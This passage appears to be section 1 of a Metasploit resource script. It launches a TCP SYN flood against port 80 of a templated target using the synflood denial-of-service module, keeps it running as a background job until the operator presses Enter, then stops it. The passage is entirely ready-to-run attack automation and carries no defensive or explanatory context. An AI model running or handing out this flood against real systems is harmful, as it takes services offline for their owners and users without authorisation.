# -------------------------------------------------------
# 1. SYN Flood — exhausts TCP connection table
#    Runs until you press Enter
# -------------------------------------------------------
print_status("Running SYN flood on port 80 — press Enter to stop...")
run_single("use auxiliary/dos/tcp/synflood")
run_single("set RHOSTS #{target}")
run_single("set RPORT 80")
run_single("run -j")          # -j runs the module as a background job
sleep 1                       # give the job a moment to register
print_status("SYN flood running in background. Press Enter to stop and continue.")
STDIN.gets                    # blocks until you hit Enter in the msfconsole window
print_status("Stopping SYN flood...")
run_single("jobs -K")         # kill all running jobs
run_single("back")